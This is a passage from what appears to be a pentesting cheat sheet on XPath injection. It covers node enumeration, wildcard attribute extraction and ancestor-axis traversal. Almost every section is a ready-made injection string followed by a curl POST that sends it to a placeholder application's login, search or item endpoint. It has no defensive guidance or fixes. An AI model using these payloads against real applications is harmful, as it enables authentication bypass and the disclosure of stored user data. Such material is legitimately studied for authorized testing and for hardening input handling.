...
### Manual Node Enumeration via XPath Injection
    ...
    - Inject a universal node selector to enumerate every node:
        ```http
        ' or 1=1 or 'a'='a' or //node() | //*
        ```
    - Send a crafted payload that returns user nodes and attributes:
        ```bash
        curl -X POST -d "username=' or 1=1 or //user/* | //user/@*" http://target-app/login
        ```
    - Outcome: unauthorized XML nodes and their attribute values are disclosed.

### Attribute Extraction with Wildcards

    - Use attribute wildcards to dump every value:
        ```http
        ' or //@* or 'a'='a'
        ```
    - Replay the payload through a high-impact parameter:
        ```bash
        curl -X POST -d "search=' or //@* or 'a'='a" http://target-app/search
        ```
    - Outcome: all attribute contents in the document are exposed in the response.

### Axis Manipulation for Parent/Ancestor Traversal

    - Target parent and ancestor axes to move upward in the tree:
        ```http
        ' or parent::node() or ancestor::* or 'a'='a'
        ```
    - Submit the payload via a parameter bound to a deeply nested node:
        ```bash
        curl -X POST -d "id=' or parent::node() or ancestor::* or 'a'='a" http://target-app/item
        ```
    - Outcome: data from surrounding nodes becomes accessible despite original restrictions.
